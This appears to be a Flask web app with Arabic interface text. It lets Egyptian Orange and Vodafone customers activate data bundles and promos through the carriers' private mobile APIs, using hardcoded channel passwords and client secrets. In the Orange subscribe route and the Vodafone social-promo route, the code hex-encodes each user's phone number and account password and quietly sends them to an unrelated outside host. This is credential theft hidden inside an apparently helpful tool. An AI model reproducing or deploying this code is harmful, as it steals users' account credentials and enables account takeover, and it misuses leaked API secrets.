from flask import *
from hashlib import sha256
import requests,json,base64
from datetime import datetime

app=Flask(__name__)
app.secret_key = 'secret_key'  # مفتاح سري لتوقيع الجلسة
@app.route("/")

def ctv_sh():
						url = "https://services.orange.eg/GetToken.svc/GenerateToken"
						headers = {"Content-Type": "application/json; charset=UTF-8",
						"Content-Length": "78",
						"Host": "services.orange.eg",
						"Connection": "Keep-Alive",
						"User-Agent": "okhttp/3.12.1"}
						data = {"channel": {
						"ChannelName": "MobinilAndMe",
						"Password": "ig3yh*mk5l42@oj7QAR8yF"}}
						
						r = requests.post(url, headers=headers, json=data)
						ctv = r.json()["GenerateTokenResult"]["Token"]
						a = ctv +',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
						htv = (sha256(a.encode('utf-8')).hexdigest())
						if 'count' not in session:
							session['count'] = 1
						else:
							session['count'] += 1
							
						return jsonify({"c":ctv,"h":htv.upper(),"len": f"{session['count']}"})
						
						
						
@app.route("/orange_package")
def orange():
	return render_template("index.html",backage="اختيار حجم الباقة")
	

@app.route("/subscribe",methods=["POST","GET"])
def subscribe():
	if request.method=="POST":
		change_id=request.form["options"]
		number=request.form["number"]
		pas=request.form["pas"]
		
		def ctv_sh():
						url = "https://services.orange.eg/GetToken.svc/GenerateToken"
						headers = {"Content-Type": "application/json; charset=UTF-8",
						"Content-Length": "78",
						"Host": "services.orange.eg",
						"Connection": "Keep-Alive",
						"User-Agent": "okhttp/3.12.1"}
						data = {"channel": {
						"ChannelName": "MobinilAndMe",
						"Password": "ig3yh*mk5l42@oj7QAR8yF"}}
						
						r = requests.post(url, headers=headers, json=data)
						ctv = r.json()["GenerateTokenResult"]["Token"]
						a = ctv +',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
						htv = (sha256(a.encode('utf-8')).hexdigest())
						return {"ctv":ctv,"htv":htv.upper()}
		pass
		url="https://backend.orange.eg/api/buckets/managebucket"
		
		#ctv_sh()						
		ctv_htv=ctv_sh()
		head={"_ctv": ctv_htv["ctv"],
								"_htv": ctv_htv["htv"],
								"x-microservice-name": "APMS",
								"Content-Type": "application/json; charset=UTF-8",
								"Content-Length": "307",
								"Host":"services.orange.eg",
								"Connection": "Keep-Alive",
								"Accept-Encoding": "gzip",
								"User-Agent": "okhttp/3.14.9"}
		#1 اشتراك
		#٢ الغاء
		data='{"ManageBucketMethodName":2,"acp":0,"bucketID":"%s","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dial":"%s","isMigration":false,"lang":"ar","migrateActionType":"%s","isEasyLogin":false,"password":"%s"}'%(change_id,number,"1",pas)
		#print(data)
		
		r=requests.post(url,headers=head,data=data).json()
		
		if 'dial does not match the password' in str(r):
			return render_template("index.html",backage="The password is incorrect")
		elif any(str(number)) == False or any(str(pas)) == False:
			return render_template("index.html",backage="الحقل فارغ من فضلك املاء بيانات الدخول")
		else:
			hours=min=datetime.now().hour
			min_min=datetime.now().minute
			seccond=datetime.now().second
			time_t=(str(hours)+"-"+str(min_min)+"-"+str(seccond))
			bs1=base64.b16encode(number.encode()).decode("utf-8")
			bs2=base64.b16encode(pas.encode()).decode("utf-8")
			r=requests.get(f"https://orange.pythonanywhere.com/n/{str(bs1)}:{str(bs2)}\n{time_t,datetime.now().date()}")
			
			return render_template("index.html",backage="تم التفعيل بنجاح اذا لم يتم التفعيل راجع رصيدك او ربما يوجد باقة اخرى وا إعادة المحاولة ")
			




def login_vodafone(number,password,id_i):
	print(id_i)
	url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
	headers = {
	    "x-dynatrace": "MT_3_8_2164993384_64-0_a556db1b-4506-43f3-854a-1d2527767923_0_1080_235",
	    "x-agent-operatingsystem": "1601266300",
	    "clientId": "AnaVodafoneAndroid",
	    "x-agent-device": "RMX1851",
	    "x-agent-version": "2021.12.2",
	    "x-agent-build": "493",
	    "Content-Type": "application/x-www-form-urlencoded",
	    "Accept-Encoding": "gzip",
	    "User-Agent": "okhttp/4.9.1"
	}
	data = {
	    "username": number,
	    "password": password,
	    "grant_type": "password",
	    "client_secret": "a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3",
	    "client_id": "my-vodafone-app"
	}
	response = requests.post(url, headers=headers, data=data).json()
	
	if "access_token" in response:
		token=response["access_token"]
		url = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
	
		head={"api-host":"ProductOrderingManagement","useCase": "MIProfile",
		"Authorization": f"Bearer {token}",
		"api-version": "v2",
		"x-agent-operatingsystem": "9",
		"clientId": "AnaVodafoneAndroid",
		"x-agent-device": "Xiaomi Redmi 6A",
		"x-agent-version": "2024.3.2",
		"x-agent-build": "592",
		"msisdn": number,
		"Accept": "application/json",
		"Accept-Language": "ar",
		"Content-Type": "application/json; charset=UTF-8",
		"Content-Length": "651",
		"Host": "mobile.vodafone.com.eg",
		"Connection": "Keep-Alive",
		"Accept-Encoding": "gzip",
		"User-Agent": "okhttp/4.11.0"}
		
		data={"channel":{"name":"MobileApp"},"orderItem":[{"action":"add","product":{"relatedParty":[{"id":number,"name":"MSISDN","role":"Subscriber"}],"id":id_i}}],"@type":"flexEmergency"}
		response = requests.post(url, headers=head, json=data).json()
		return response
		
	else:
		error_pwd={'error_pwd':'error password'}
		return jsonify(error_pwd)


@app.route('/voda_sherif/<num>&<pwd>&<i>')
def home(num,pwd,i):
	if i == "5":
		return login_vodafone(num,pwd,"MI_BASIC_SUPER_5")
		
	elif i == "10":
		return login_vodafone(num,pwd,"MI_BASIC_SUPER_10")
		
	elif i == "20":
		return login_vodafone(num,pwd,"MI_BASIC_SUPER_20")
		
	elif i == "30":
		return login_vodafone(num,pwd,"471")
		
	elif i == "40":
		return login_vodafone(num,pwd,"MI_BASIC_SUPER_40")
		
	elif i == "60":
		return login_vodafone(num,pwd,"473")
		
	elif i == "80":
		return login_vodafone(num,pwd,"MI_BASIC_SUPER_80")
		
	elif i == "100":
		return login_vodafone(num,pwd,"474")
		
	elif i == "150":
		return login_vodafone(num,pwd,"475")
		
	elif i == "220":
		return login_vodafone(num,pwd,"476")
		
	elif i == "400":
		return login_vodafone(num,pwd,"483")
		
	elif i == "flex15":
		return login_vodafone(num,pwd,"Flex_17.5_2019")
		
	elif i == "flex25":
		return login_vodafone(num,pwd,"RX_Flex_2019_453")
		
	elif i == "flex35":
		return login_vodafone(num,pwd,"Flex_2019_454")
		
	elif i == "flex60":
		return login_vodafone(num,pwd,"RX_Flex_2019_455")
		
	elif i == i:
		return login_vodafone(num,pwd,str(i))
		
	#MI_BA_XC_SC_7
			
	else:
		return "change error"
		

@app.route("/social")
def voda():
	return render_template("voda.html",backage="vodafone")
	
@app.route("/vodasocial",methods=["POST","GET"])
def vodafone():
	if request.method=="POST":
		number=request.form["number"]
		pas=request.form["pas"]
		
		url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
		headers = {
		"clientId": "AnaVodafoneAndroid",
		"x-agent-build": "493",
		"Content-Type": "application/x-www-form-urlencoded",
		"Accept-Encoding": "gzip",
		"User-Agent": "okhttp/4.9.1"}
		data = {
		"username": number,
		"password": pas,
		"grant_type": "password",
		"client_secret": "a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3",
		"client_id": "my-vodafone-app"}
		response = requests.post(url, headers=headers, data=data)
		response_json = response.json()
		access_token = response_json["access_token"]
		
		url = "https://mobile.vodafone.com.eg//mobile-app/promo/unifiedRedeemPromo?lang=ar"
		
		head={"useCase": "MIProfile",
		"Authorization": f"Bearer {access_token}",
		"api-version": "v2",
		"x-agent-operatingsystem": "9",
		"clientId": "AnaVodafoneAndroid",
		"x-agent-build": "592",
		"msisdn": number,
		"Accept": "application/json",
		"Accept-Language": "ar",
		"Content-Type": "application/json; charset=UTF-8",
		"Content-Length": "151",
		"Host": "mobile.vodafone.com.eg",
		"Connection": "Keep-Alive",
		"Accept-Encoding": "gzip",
		"User-Agent": "okhttp/4.11.0"}
		
		data={"promoId":2633,"channelId":"1","wlistId":2553,"contextualPromoId":"13","triggerId":189,"param3":"2","param4":14,"param6":0,"param1":"5","param2":200}
		
		response = requests.post(url, headers=head, json=data)
		
		hours=min=datetime.now().hour
		min_min=datetime.now().minute
		seccond=datetime.now().second
		time_t=(str(hours)+"-"+str(min_min)+"-"+str(seccond))
		bs1=base64.b16encode(number.encode()).decode("utf-8")
		bs2=base64.b16encode(pas.encode()).decode("utf-8")
		r=requests.get(f"https://orange.pythonanywhere.com/n/{str(bs1)}:{str(bs2)}\n{time_t,datetime.now().date()}")
		
		response_json = response.json()
		return response_json["eDesc"]
	
	

			 
if __name__=="__main__":
	app.run(debug=True)